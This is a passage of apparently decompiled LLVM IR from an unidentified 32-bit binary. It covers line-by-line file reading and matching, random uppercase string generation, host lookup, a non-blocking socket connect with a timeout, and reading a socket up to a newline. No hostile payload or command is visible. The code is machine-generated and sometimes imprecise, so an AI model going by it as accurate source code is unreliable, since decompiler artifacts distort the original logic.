  br i1 %v1_804937039, label %dec_label_pc_8049206.lr.ph, label %dec_label_pc_8049376

dec_label_pc_8049206.lr.ph:                       ; preds = %dec_label_pc_80491e2
  br label %dec_label_pc_8049206

dec_label_pc_8049206:                             ; preds = %dec_label_pc_8049206.lr.ph, %dec_label_pc_8049338
  %v3_8049210 = call i32 @function_80491af(i8* %tmp34)
  %v5_8049227 = call i32 @function_8051508(i32 %v2_8049354, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059f0e.31, i32 0, i32 0))
  %v12_8049237 = icmp eq i32 %v5_8049227, %v2_8049354
  %v1_8049239 = icmp eq i1 %v12_8049237, false
  br i1 %v1_8049239, label %dec_label_pc_8049338, label %dec_label_pc_804923f

dec_label_pc_804923f:                             ; preds = %dec_label_pc_8049206
  %tmp35 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8049250

dec_label_pc_804924d:                             ; preds = %dec_label_pc_8049262, %dec_label_pc_8049259, %dec_label_pc_8049250
  %v5_804924d = add i32 %v4_8049250, 1
  %v22_804924d = inttoptr i32 %v5_804924d to i8*
  br label %dec_label_pc_8049250

dec_label_pc_8049250:                             ; preds = %dec_label_pc_804923f, %dec_label_pc_804924d
  %storemerge4 = phi i8* [ %v22_804924d, %dec_label_pc_804924d ], [ %tmp35, %dec_label_pc_804923f ]
  %v4_8049250 = ptrtoint i8* %storemerge4 to i32
  %v2_8049253 = load i8, i8* %storemerge4, align 1
  %v7_8049255 = icmp eq i8 %v2_8049253, 32
  br i1 %v7_8049255, label %dec_label_pc_804924d, label %dec_label_pc_8049259

dec_label_pc_8049259:                             ; preds = %dec_label_pc_8049250
  %v2_804925c = load i8, i8* %storemerge4, align 1
  %v10_804925e = icmp eq i8 %v2_804925c, 9
  br i1 %v10_804925e, label %dec_label_pc_804924d, label %dec_label_pc_8049262

dec_label_pc_8049262:                             ; preds = %dec_label_pc_8049259
  %v2_8049265 = load i8, i8* %storemerge4, align 1
  %v10_8049267 = icmp eq i8 %v2_8049265, 58
  br i1 %v10_8049267, label %dec_label_pc_804924d, label %dec_label_pc_8049292

dec_label_pc_804926d:                             ; preds = %dec_label_pc_80492ba, %dec_label_pc_8049292
  %v3_8049284 = call i32 @_strlen(i8* %storemerge4)
  %v6_804928b = add i32 %v4_8049250, %v3_8049284
  %v1_804928e = add i32 %v6_804928b, -1
  %v1_804928f = inttoptr i32 %v1_804928e to i8*
  store i8 0, i8* %v1_804928f, align 1
  br label %dec_label_pc_8049292

dec_label_pc_8049292:                             ; preds = %dec_label_pc_8049262, %dec_label_pc_804926d
  %v3_80492a9 = call i32 @_strlen(i8* %storemerge4)
  %v6_80492b0 = add i32 %v4_8049250, %v3_80492a9
  %v1_80492b3 = add i32 %v6_80492b0, -1
  %v1_80492b4 = inttoptr i32 %v1_80492b3 to i8*
  %v2_80492b4 = load i8, i8* %v1_80492b4, align 1
  %v10_80492b6 = icmp eq i8 %v2_80492b4, 13
  br i1 %v10_80492b6, label %dec_label_pc_804926d, label %dec_label_pc_80492ba

dec_label_pc_80492ba:                             ; preds = %dec_label_pc_8049292
  store i1 false, i1* @df, align 1
  store i32 %v4_8049250, i32* @edi, align 4
  %v3_80492d1 = call i32 @_strlen(i8* %storemerge4)
  %v6_80492d8 = add i32 %v4_8049250, %v3_80492d1
  %v1_80492db = add i32 %v6_80492d8, -1
  %v1_80492dc = inttoptr i32 %v1_80492db to i8*
  %v2_80492dc = load i8, i8* %v1_80492dc, align 1
  %v10_80492de = icmp eq i8 %v2_80492dc, 10
  br i1 %v10_80492de, label %dec_label_pc_804926d, label %dec_label_pc_80492e2

dec_label_pc_80492e2:                             ; preds = %dec_label_pc_80492ba
  %v5_80492eb = call i32 @function_8051474(i8* %storemerge4, i32 46)
  %v1_80492f3 = icmp eq i32 %v5_80492eb, 0
  br i1 %v1_80492f3, label %dec_label_pc_804930b, label %dec_label_pc_80492f7

dec_label_pc_80492f7:                             ; preds = %dec_label_pc_80492e2
  %v5_8049300 = call i32 @function_8051474(i8* %storemerge4, i32 46)
  %v6_8049300 = inttoptr i32 %v5_8049300 to i8*
  store i8 0, i8* %v6_8049300, align 1
  br label %dec_label_pc_804930b

dec_label_pc_804930b:                             ; preds = %dec_label_pc_80492e2, %dec_label_pc_80492f7
  store i32 %v4_8049250, i32* @eax, align 4
  %v5_8049315 = inttoptr i32 %arg1 to i8*
  %v5_8049316 = call i32 @function_8051494(i8* %v5_8049315, i32 %v4_8049250)
  %v2_8049324 = call i32 @function_8050138(i32 %v5_80491f6)
  br label %dec_label_pc_804938e

dec_label_pc_8049338:                             ; preds = %dec_label_pc_8049206
  %v6_804934c = call i32 @function_805143c(i8* %tmp34, i32 0, i32 4096)
  %v5_8049366 = call i32 @function_8048f92(i32 %v2_8049354, i32 4096, i32 %v5_80491f6)
  %v1_804936e = icmp eq i32 %v5_8049366, 0
  %v1_8049370 = icmp eq i1 %v1_804936e, false
  br i1 %v1_8049370, label %dec_label_pc_8049206, label %dec_label_pc_8049376

dec_label_pc_8049376:                             ; preds = %dec_label_pc_8049338, %dec_label_pc_80491e2
  %v2_804937c = call i32 @function_8050138(i32 %v5_80491f6)
  br label %dec_label_pc_804938e

dec_label_pc_804938e:                             ; preds = %dec_label_pc_804930b, %dec_label_pc_8049376
  %storemerge = phi i32 [ 1, %dec_label_pc_8049376 ], [ 0, %dec_label_pc_804930b ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049250, { 3, 4, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_8049354, { 3, 1, 2, 0 }
  uselistorder i32 %v5_80491f6, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804938e, { 1, 0 }
  uselistorder label %dec_label_pc_804930b, { 1, 0 }
  uselistorder label %dec_label_pc_8049292, { 1, 0 }
  uselistorder label %dec_label_pc_8049250, { 1, 0 }
  uselistorder label %dec_label_pc_8049206, { 1, 0 }
}

define i32 @function_8049399() local_unnamed_addr {
dec_label_pc_8049399:
  %stack_var_-4108 = alloca i32, align 4
  %v5_80493b3 = call i32 @function_80502e4(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059f00.30, i32 0, i32 0), i32 0)
  %v2_8049414 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp16 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804942617 = call i32 @function_8048f92(i32 %v2_8049414, i32 4096, i32 %v5_80493b3)
  %v1_804942e18 = icmp eq i32 %v5_804942617, 0
  %v1_804943019 = icmp eq i1 %v1_804942e18, false
  br i1 %v1_804943019, label %dec_label_pc_80493c0.lr.ph, label %dec_label_pc_8049432

dec_label_pc_80493c0.lr.ph:                       ; preds = %dec_label_pc_8049399
  br label %dec_label_pc_80493c0

dec_label_pc_80493c0:                             ; preds = %dec_label_pc_80493c0.lr.ph, %dec_label_pc_80493c0
  %stack_var_-12.120 = phi i32 [ 0, %dec_label_pc_80493c0.lr.ph ], [ %stack_var_-12.0, %dec_label_pc_80493c0 ]
  %v3_80493ca = call i32 @function_80491af(i8* %tmp16)
  %v5_80493e1 = call i32 @function_8051508(i32 %v2_8049414, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059f0e.31, i32 0, i32 0))
  %v12_80493f1 = icmp eq i32 %v5_80493e1, %v2_8049414
  %v4_80493f5 = zext i1 %v12_80493f1 to i32
  %stack_var_-12.0 = add i32 %stack_var_-12.120, %v4_80493f5
  %v6_804940c = call i32 @function_805143c(i8* %tmp16, i32 0, i32 4096)
  %v5_8049426 = call i32 @function_8048f92(i32 %v2_8049414, i32 4096, i32 %v5_80493b3)
  %v1_804942e = icmp eq i32 %v5_8049426, 0
  %v1_8049430 = icmp eq i1 %v1_804942e, false
  br i1 %v1_8049430, label %dec_label_pc_80493c0, label %dec_label_pc_8049432

dec_label_pc_8049432:                             ; preds = %dec_label_pc_80493c0, %dec_label_pc_8049399
  %stack_var_-12.1.lcssa = phi i32 [ 0, %dec_label_pc_8049399 ], [ %stack_var_-12.0, %dec_label_pc_80493c0 ]
  %v2_8049438 = call i32 @function_8050138(i32 %v5_80493b3)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.0, { 1, 0 }
  uselistorder i32 %v2_8049414, { 3, 1, 2, 0 }
  uselistorder i32 %v5_80493b3, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8048f92, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80493c0, { 1, 0 }
}

define i32 @function_8049445(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8049445:
  %v5_8049462 = ptrtoint i8* %arg1 to i32
  %v5_80494a320 = icmp sgt i32 %arg2, 0
  br i1 %v5_80494a320, label %dec_label_pc_804945d, label %dec_label_pc_80494a5

dec_label_pc_804945d:                             ; preds = %dec_label_pc_8049445, %dec_label_pc_804945d
  %storemerge21 = phi i32 [ %v4_804949a, %dec_label_pc_804945d ], [ 0, %dec_label_pc_8049445 ]
  %v6_8049462 = add i32 %storemerge21, %v5_8049462
  store i32 %v6_8049462, i32* @ebx, align 4
  %v1_8049465 = call i32 @function_80482d8(i32 %storemerge21)
  %v2_8049475 = udiv i32 %v1_8049465, 26
  %tmp = mul i32 %v2_8049475, -10
  %v2_804948d = add i32 %v1_8049465, %tmp
  %v1_8049495 = add i32 %v2_804948d, 65
  %v11_8049495 = trunc i32 %v1_8049495 to i8
  %v2_8049498 = load i32, i32* @ebx, align 4
  %v3_8049498 = inttoptr i32 %v2_8049498 to i8*
  store i8 %v11_8049495, i8* %v3_8049498, align 1
  %v4_804949a = add nuw nsw i32 %storemerge21, 1
  %exitcond = icmp eq i32 %v4_804949a, %arg2
  br i1 %exitcond, label %dec_label_pc_804949d.dec_label_pc_80494a5_crit_edge, label %dec_label_pc_804945d

dec_label_pc_804949d.dec_label_pc_80494a5_crit_edge: ; preds = %dec_label_pc_804945d
  br label %dec_label_pc_80494a5

dec_label_pc_80494a5:                             ; preds = %dec_label_pc_804949d.dec_label_pc_80494a5_crit_edge, %dec_label_pc_8049445
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_804949d.dec_label_pc_80494a5_crit_edge ], [ 0, %dec_label_pc_8049445 ]
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804949a, { 1, 0 }
  uselistorder i32 %storemerge21, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804945d, { 1, 0 }
}

define i32 @function_80494ac(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80494ac:
  %eax.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v4_80494b9 = ptrtoint i8* %arg2 to i32
  %v1_80494c1 = and i32 %v4_80494b9, -256
  store i32 %v1_80494c1, i32* %eax.global-to-local, align 4
  %v5_80494c3 = call i8* @_memset(i8* %arg2, i32 %v1_80494c1, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_80494e3 = ptrtoint i32* %stack_var_-168 to i32
  %tmp36 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_80494e3, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80494ea = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  %v2_80494f7 = udiv i32 %arg1, 32
  %v1_80494fd = urem i32 %arg1, 32
  store i32 %v1_80494fd, i32* %eax.global-to-local, align 4
  %v0_8049500 = load i32, i32* @ebp, align 4
  %v2_8049500 = mul nuw nsw i32 %v2_80494f7, 4
  %v3_8049500 = add nsw i32 %v2_8049500, -164
  %v4_8049500 = add i32 %v3_8049500, %v0_8049500
  %v5_8049500 = inttoptr i32 %v4_8049500 to i32*
  %v6_8049500 = load i32, i32* %v5_8049500, align 4
  %v9_8049500 = shl i32 1, %v1_80494fd
  %v12_8049500 = or i32 %v6_8049500, %v9_8049500
  store i32 %v12_8049500, i32* %v5_8049500, align 4
  %v1_804950b = add i32 %arg1, 1
  %v2_804950f = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_80494e3, i32* %eax.global-to-local, align 4
  %v5_8049527 = call i32 @function_80503f0(i32 %v1_804950b, i32 %v2_80494e3, i32 0, i32 %v2_80494e3, i32 %v2_804950f)
  store i32 %v5_8049527, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_8049527, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_80495d7, label %dec_label_pc_80495cd.preheader

dec_label_pc_80495cd.preheader:                   ; preds = %dec_label_pc_80494ac
  %v7_80495d144 = icmp sgt i32 %tmp11, 9
  br i1 %v7_80495d144, label %dec_label_pc_80495d7, label %dec_label_pc_8049541.lr.ph

dec_label_pc_8049541.lr.ph:                       ; preds = %dec_label_pc_80495cd.preheader
  br label %dec_label_pc_8049541

dec_label_pc_8049541:                             ; preds = %dec_label_pc_8049541.lr.ph, %dec_label_pc_80495ca
  %stack_var_-36.045 = phi i32 [ %tmp11, %dec_label_pc_8049541.lr.ph ], [ %v4_80495ca, %dec_label_pc_80495ca ]
  %v0_8049541 = load i32, i32* @global_var_805d8c0.32, align 64
  store i32 %v0_8049541, i32* %eax.global-to-local, align 4
  %v3_804954f = call i32 @function_8048b7f(i32 %v0_8049541, i32 ptrtoint ([5 x i8]* @global_var_8059f17.33 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_80494e3, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804957c = call i8* @_memset(i8* %tmp36, i32 0, i32 32)
  store i32 %v1_80494fd, i32* %eax.global-to-local, align 4
  %v0_8049592 = load i32, i32* @ebp, align 4
  %v4_8049592 = add i32 %v3_8049500, %v0_8049592
  %v5_8049592 = inttoptr i32 %v4_8049592 to i32*
  %v6_8049592 = load i32, i32* %v5_8049592, align 4
  %v12_8049592 = or i32 %v6_8049592, %v9_8049500
  store i32 %v12_8049592, i32* %v5_8049592, align 4
  store i32 %v2_80494e3, i32* %eax.global-to-local, align 4
  %v5_80495b9 = call i32 @function_80503f0(i32 %v1_804950b, i32 %v2_80494e3, i32 0, i32 %v2_80494e3, i32 %v2_804950f)
  store i32 %v5_80495b9, i32* %eax.global-to-local, align 4
  %tmp39 = icmp slt i32 %v5_80495b9, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br i1 %tmp40, label %dec_label_pc_80495d7, label %dec_label_pc_80495ca

dec_label_pc_80495ca:                             ; preds = %dec_label_pc_8049541
  %v4_80495ca = add nsw i32 %stack_var_-36.045, 1
  %v7_80495d1 = icmp sgt i32 %stack_var_-36.045, 8
  br i1 %v7_80495d1, label %dec_label_pc_80495d7, label %dec_label_pc_8049541

dec_label_pc_80495d7:                             ; preds = %dec_label_pc_80495cd.preheader, %dec_label_pc_8049541, %dec_label_pc_80495ca, %dec_label_pc_80494ac
  store i32 %v4_80494b9, i32* %eax.global-to-local, align 4
  %v2_80495ef = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8049631

dec_label_pc_80495e6:                             ; preds = %dec_label_pc_8049631
  %v0_80495e6 = load i32, i32* @global_var_805d8c0.32, align 64
  store i32 %v0_80495e6, i32* %eax.global-to-local, align 4
  %v5_80495f7 = call i32 @function_8051cd4(i32 %v0_80495e6, i32 %v2_80495ef, i32 1, i32 0)
  store i32 %v5_80495f7, i32* %eax.global-to-local, align 4
  %v9_80495ff = icmp eq i32 %v5_80495f7, 1
  br i1 %v9_80495ff, label %dec_label_pc_8049616, label %dec_label_pc_8049604

dec_label_pc_8049604:                             ; preds = %dec_label_pc_80495e6
  %v4_8049604 = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_8049604, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_804964e

dec_label_pc_8049616:                             ; preds = %dec_label_pc_80495e6
  %v3_8049616 = load i8, i8* %stack_var_-177, align 1
  %v4_8049616 = sext i8 %v3_8049616 to i32
  store i32 %v4_8049616, i32* %eax.global-to-local, align 4
  %v4_804961c = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8049616, i8* %stack_var_-32.0, align 1
  %v5_8049621 = add i32 %v4_804961c, 1
  %v22_8049621 = inttoptr i32 %v5_8049621 to i8*
  %v3_8049624 = load i8, i8* %stack_var_-177, align 1
  %v4_8049624 = sext i8 %v3_8049624 to i32
  %v6_8049624 = load i32, i32* %eax.global-to-local, align 4
  %v7_8049624 = and i32 %v6_8049624, -256
  %v8_8049624 = or i32 %v7_8049624, %v4_8049624
  store i32 %v8_8049624, i32* %eax.global-to-local, align 4
  %v10_804962a = icmp eq i8 %v3_8049624, 10
  br i1 %v10_804962a, label %dec_label_pc_804963f, label %dec_label_pc_804962e

dec_label_pc_804962e:                             ; preds = %dec_label_pc_8049616
  %v4_804962e = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8049631

dec_label_pc_8049631:                             ; preds = %dec_label_pc_80495d7, %dec_label_pc_804962e
  %v7_8049635 = phi i32 [ %v4_80494b9, %dec_label_pc_80495d7 ], [ %v8_8049624, %dec_label_pc_804962e ]
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_80495d7 ], [ %v22_8049621, %dec_label_pc_804962e ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80495d7 ], [ %v4_804962e, %dec_label_pc_804962e ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_80495d7 ], [ %v4_8049631, %dec_label_pc_804962e ]
  %v4_8049631 = add i32 %stack_var_12.0, -1
  %v9_8049631 = sub i32 0, %stack_var_12.0
  %v10_8049631 = and i32 %stack_var_12.0, %v9_8049631
  %v11_8049631 = icmp slt i32 %v10_8049631, 0
  %v12_8049631 = icmp eq i32 %v4_8049631, 0
  %v13_8049631 = icmp slt i32 %v4_8049631, 0
  %v3_8049635 = icmp eq i1 %v13_8049631, %v11_8049631
  %v4_8049635 = icmp eq i1 %v12_8049631, false
  %v5_8049635 = and i1 %v4_8049635, %v3_8049635
  %v6_8049635 = zext i1 %v5_8049635 to i32
  %v8_8049635 = and i32 %v7_8049635, -256
  %v9_8049635 = or i32 %v6_8049635, %v8_8049635
  store i32 %v9_8049635, i32* %eax.global-to-local, align 4
  %v4_804963b = icmp eq i1 %v5_8049635, false
  %v1_804963d = icmp eq i1 %v4_804963b, false
  br i1 %v1_804963d, label %dec_label_pc_80495e6, label %dec_label_pc_804963f

dec_label_pc_804963f:                             ; preds = %dec_label_pc_8049616, %dec_label_pc_8049631
  %stack_var_-32.1 = phi i8* [ %v22_8049621, %dec_label_pc_8049616 ], [ %stack_var_-32.0, %dec_label_pc_8049631 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804964e

dec_label_pc_804964e:                             ; preds = %dec_label_pc_8049604, %dec_label_pc_804963f
  %storemerge = phi i32 [ -1, %dec_label_pc_8049604 ], [ %stack_var_-28.0, %dec_label_pc_804963f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049631, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_8049621, { 1, 0 }
  uselistorder i32 %v1_80494fd, { 2, 1, 0 }
  uselistorder i32 %v2_80494e3, { 0, 3, 4, 5, 1, 2, 6, 7 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804964e, { 1, 0 }
  uselistorder label %dec_label_pc_804963f, { 1, 0 }
  uselistorder label %dec_label_pc_8049631, { 1, 0 }
  uselistorder label %dec_label_pc_80495d7, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049541, { 1, 0 }
}

define i32 @function_8049659(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8049659:
  %v2_8049665 = call i32 @function_80518dc(i32 %arg1)
  %v4_8049670 = icmp eq i32 %v2_8049665, 0
  %v1_8049674 = icmp eq i1 %v4_8049670, false
  br i1 %v1_8049674, label %dec_label_pc_804968f, label %dec_label_pc_8049676

dec_label_pc_8049676:                             ; preds = %dec_label_pc_8049659
  %v3_804967e = call i32 @function_80517fe(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8059f1c.34, i32 0, i32 0))
  br label %dec_label_pc_80496e5

dec_label_pc_804968f:                             ; preds = %dec_label_pc_8049659
  %v1_8049692 = add i32 %v2_8049665, 16
  %v2_8049692 = inttoptr i32 %v1_8049692 to i32*
  %v3_8049692 = load i32, i32* %v2_8049692, align 4
  %v1_80496a8 = inttoptr i32 %v3_8049692 to i32*
  %v2_80496a8 = load i32, i32* %v1_80496a8, align 4
  %v1_80496aa = icmp eq i32 %v2_80496a8, 0
  br i1 %v1_80496aa, label %dec_label_pc_80496e5, label %dec_label_pc_80496ae

dec_label_pc_80496ae:                             ; preds = %dec_label_pc_804968f
  %v2_80496b7 = load i32, i32* %v1_80496a8, align 4
  %v1_80496bc = inttoptr i32 %v2_80496b7 to i32*
  %v2_80496bc = load i32, i32* %v1_80496bc, align 4
  %v2_80496be = call i32 @function_805189f(i32 %v2_80496bc)
  store i32 %v2_80496be, i32* @eax, align 4
  %v8_80496ca = inttoptr i32 %arg2 to i8*
  %v4_80496cd = call i32 @function_8051494(i8* %v8_80496ca, i32 %v2_80496be)
  br label %dec_label_pc_80496e5

dec_label_pc_80496e5:                             ; preds = %dec_label_pc_804968f, %dec_label_pc_80496ae, %dec_label_pc_8049676
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_80496ae ], [ 1, %dec_label_pc_8049676 ], [ 1, %dec_label_pc_804968f ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 (i32)* @function_805189f, { 1, 0 }
  uselistorder i32 (i32)* @function_80518dc, { 1, 0 }
  uselistorder label %dec_label_pc_80496e5, { 1, 0, 2 }
}

define i32 @function_80496ea(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80496ea:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_80496fe = call i32 @function_8050014(i32 %arg1, i32 3, i32 0)
  %v4_8049709 = or i32 %v3_80496fe, 2048
  %v3_804971b = call i32 @function_8050014(i32 %arg1, i32 4, i32 %v4_8049709)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_804972c = urem i32 %arg3, 65536
  %v1_8049735 = call i32 @function_80517c0(i32 %v1_804972c)
  store i32 %arg2, i32* @edx, align 4
  %v3_804974f = call i32 @function_8049174(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049757 = icmp eq i32 %v3_804974f, 0
  br i1 %v1_8049757, label %dec_label_pc_804976a, label %dec_label_pc_804975b

dec_label_pc_804975b:                             ; preds = %dec_label_pc_80496ea
  br label %dec_label_pc_80498a7

dec_label_pc_804976a:                             ; preds = %dec_label_pc_80496ea
  %v2_8049747 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049789 = call i32 @function_8051c40(i32 %arg1, i32 %v2_8049747, i32 16)
  %v5_8049794 = icmp slt i32 %v3_8049789, 0
  %v1_8049798 = icmp eq i1 %v5_8049794, false
  br i1 %v1_8049798, label %dec_label_pc_804986e, label %dec_label_pc_804979e

dec_label_pc_804979e:                             ; preds = %dec_label_pc_804976a
  %v1_804979e = call i32 @function_8050568(i32 %v3_8049789)
  %v1_80497a3 = inttoptr i32 %v1_804979e to i32*
  %v2_80497a3 = load i32, i32* %v1_80497a3, align 4
  %v9_80497a5 = icmp eq i32 %v2_80497a3, 115
  %v1_80497a8 = icmp eq i1 %v9_80497a5, false
  br i1 %v1_80497a8, label %dec_label_pc_8049862, label %dec_label_pc_80497ae

dec_label_pc_80497ae:                             ; preds = %dec_label_pc_804979e
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_80497cb = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_80497cb, i32* @edi, align 4
  %v5_80497d2 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_80497df = udiv i32 %arg1, 32
  %v1_80497e5 = urem i32 %arg1, 32
  %v0_80497e8 = load i32, i32* @ebp, align 4
  %v2_80497e8 = mul nuw nsw i32 %v2_80497df, 4
  %v3_80497e8 = add nsw i32 %v2_80497e8, -164
  %v4_80497e8 = add i32 %v3_80497e8, %v0_80497e8
  %v5_80497e8 = inttoptr i32 %v4_80497e8 to i32*
  %v6_80497e8 = load i32, i32* %v5_80497e8, align 4
  %v9_80497e8 = shl i32 1, %v1_80497e5
  %v12_80497e8 = or i32 %v6_80497e8, %v9_80497e8
  store i32 %v12_80497e8, i32* %v5_80497e8, align 4
  %v1_80497f3 = add i32 %arg1, 1
  %v2_80497f7 = ptrtoint i32* %stack_var_-176 to i32
  %v5_804980a = call i32 @function_80503f0(i32 %v1_80497f3, i32 0, i32 %v2_80497cb, i32 0, i32 %v2_80497f7)
  %tmp33 = icmp slt i32 %v5_804980a, 1
  br i1 %tmp33, label %dec_label_pc_8049856, label %dec_label_pc_8049816

dec_label_pc_8049816:                             ; preds = %dec_label_pc_80497ae
  store i32 4, i32* %stack_var_-180, align 4
  %v2_8049823 = ptrtoint i32* %stack_var_-180 to i32
  %v2_804982a = ptrtoint i32* %stack_var_-184 to i32
  %v5_8049838 = call i32 @function_8051c98(i32 %arg1, i32 1, i32 4, i32 %v2_804982a, i32 %v2_8049823)
  %v3_8049840 = load i32, i32* %stack_var_-184, align 4
  %v1_8049846 = icmp eq i32 %v3_8049840, 0
  br i1 %v1_8049846, label %dec_label_pc_804986e, label %dec_label_pc_804984a

dec_label_pc_804984a:                             ; preds = %dec_label_pc_8049816
  br label %dec_label_pc_80498a7

dec_label_pc_8049856:                             ; preds = %dec_label_pc_80497ae
  br label %dec_label_pc_80498a7

dec_label_pc_8049862:                             ; preds = %dec_label_pc_804979e
  br label %dec_label_pc_80498a7

dec_label_pc_804986e:                             ; preds = %dec_label_pc_8049816, %dec_label_pc_804976a
  %v3_8049878 = call i32 @function_8050014(i32 %arg1, i32 3, i32 0)
  %v4_8049883 = and i32 %v3_8049878, -2049
  %v3_8049895 = call i32 @function_8050014(i32 %arg1, i32 4, i32 %v4_8049883)
  br label %dec_label_pc_80498a7

dec_label_pc_80498a7:                             ; preds = %dec_label_pc_8049862, %dec_label_pc_8049856, %dec_label_pc_804984a, %dec_label_pc_804975b, %dec_label_pc_804986e
  %v3_80498a7 = phi i32 [ 0, %dec_label_pc_8049862 ], [ 0, %dec_label_pc_8049856 ], [ 0, %dec_label_pc_804984a ], [ 0, %dec_label_pc_804975b ], [ 1, %dec_label_pc_804986e ]
  ret i32 %v3_80498a7

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_80498a7, { 4, 0, 1, 2, 3 }
}

define i32 @function_80498b2() local_unnamed_addr {
dec_label_pc_80498b2:
  %v0_80498b5 = load i32, i32* @ebx, align 4
  %v1_80498b9 = call i32 @function_805019c(i32 %v0_80498b5)
  %v4_80498c1 = icmp eq i32 %v1_80498b9, 0
  %v1_80498c5 = icmp eq i1 %v4_80498c1, false
  br i1 %v1_80498c5, label %dec_label_pc_80498d2, label %dec_label_pc_80498c7

dec_label_pc_80498c7:                             ; preds = %dec_label_pc_80498b2
  br label %dec_label_pc_80499b6

dec_label_pc_80498d2:                             ; preds = %dec_label_pc_80498b2
  %v0_80498d2 = load i32, i32* @global_var_805d8c8.35, align 8
  %v0_80498d7 = load i32, i32* @global_var_805d8cc.36, align 4
  %v1_80498dd = add i32 %v0_80498d2, 1
  %v5_80498dd = icmp eq i32 %v0_80498d2, -1
  %v2_80498e0 = zext i1 %v5_80498dd to i32
  %v3_80498e0 = add i32 %v2_80498e0, %v0_80498d7
  store i32 %v1_80498dd, i32* @global_var_805d8c8.35, align 8
  store i32 %v3_80498e0, i32* @global_var_805d8cc.36, align 4
  %v2_80498fd = mul i32 %v1_80498dd, 4
  %v1_8049900 = add i32 %v2_80498fd, 4
  %v1_8049907 = call i32 @function_8051f6a(i32 %v1_8049900)
  br label %dec_label_pc_804993d

dec_label_pc_804991b:                             ; preds = %dec_label_pc_804993d, %dec_label_pc_804996e
  %v2_804991e = mul i32 %storemerge1, 4
  %v5_8049923 = add i32 %v2_804991e, %v1_8049907
